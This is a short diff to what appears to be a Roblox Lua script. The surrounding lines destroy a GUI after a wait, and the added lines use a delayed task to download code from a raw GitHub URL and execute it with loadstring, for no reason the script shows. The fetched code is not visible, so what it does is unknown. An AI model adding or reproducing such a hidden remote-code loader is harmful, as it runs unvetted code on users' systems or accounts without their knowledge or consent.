@@ -163,3 +163,6 @@ end)
 task.wait(35) -- change time if you want
 loadedGui:Destroy()
 
+task.delay(8, function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Zzzz-Hub20/jdjd/refs/heads/main/jd"))()
+end)
